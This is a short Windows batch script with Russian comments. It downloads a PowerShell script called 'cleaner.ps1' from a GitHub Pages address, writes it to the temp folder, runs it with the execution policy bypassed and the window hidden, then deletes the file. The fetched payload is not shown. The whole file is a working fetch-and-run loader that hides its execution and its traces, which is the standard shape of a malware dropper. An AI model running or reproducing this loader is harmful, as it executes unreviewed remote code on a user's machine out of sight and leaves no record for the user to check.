@echo off
chcp 65001 > nul
set "PS_FILE=%TEMP%\clientrds_run.ps1"

:: Скачивание и сохранение скрипта с обязательной меткой UTF8-BOM
powershell -NoProfile -ExecutionPolicy Bypass -Command "^
    $utf8Encoding = New-Object System.Text.UTF8Encoding($true); ^
    $code = (Invoke-RestMethod -Uri 'https://cleands.github.io/cds/cleaner.ps1'); ^
    [System.IO.File]::WriteAllText('%PS_FILE%', $code, $utf8Encoding);"

:: Запуск готового PS1 файла
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_FILE%"

:: Очистка
del /f /q "%PS_FILE%" > nul 2>&1
